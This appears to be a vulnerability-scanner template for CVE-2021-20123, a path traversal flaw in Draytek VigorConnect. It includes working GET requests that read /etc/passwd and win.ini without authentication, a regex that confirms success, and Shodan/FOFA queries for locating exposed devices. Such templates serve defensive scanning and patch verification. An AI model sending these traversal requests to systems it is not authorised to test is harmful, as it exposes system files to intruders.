http:
- matchers:
  - part: header
    type: word
    words:
    - application/octet-stream
  - condition: or
    part: body
    regex:
    - 'root:.*:0:0:'
    - for 16-bit app support
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/ACSServer/DownloadFileServlet?show_file_name=../../../../../../etc/passwd&type=uploadfile&path=anything'
  - '{{BaseURL}}/ACSServer/DownloadFileServlet?show_file_name=../../../../../../windows/win.ini&type=uploadfile&path=anything'
  stop-at-first-match: true
id: CVE-2021-20123
info:
  author: 0x_Akoko
  classification:
    cpe: cpe:2.3:a:draytek:vigorconnect:1.6.0:beta3:*:*:*:*:*:*
    cve-id: CVE-2021-20123
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
    epss-percentile: 0.9988
    epss-score: 0.93989
  description: 'Draytek VigorConnect 1.6.0-B3 is susceptible to local file inclusion
    in the file download functionality of the DownloadFileServlet endpoint. An unauthenticated
    attacker could leverage this vulnerability to download arbitrary files from the
    underlying operating system with root privileges.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    read sensitive files on the server, potentially leading to unauthorized access
    or information disclosure.

    '
  metadata:
    fofa-query: body="vigorconnect"
    max-request: 2
    product: vigorconnect
    shodan-query:
    - http.html:"VigorConnect"
    - http.html:"vigorconnect"
    vendor: draytek
    verified: true
  name: Draytek VigorConnect 1.6.0-B - Local File Inclusion
  reference:
  - https://www.tenable.com/security/research/tra-2021-42
  - https://nvd.nist.gov/vuln/detail/CVE-2021-20123
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Apply the latest security patches or updates provided by the vendor
    to fix the LFI vulnerability in Draytek VigorConnect 1.6.0-B.

    '
  severity: high
  tags: cve2021,cve,draytek,lfi,vigorconnect,tenable,kev,vkev,vuln
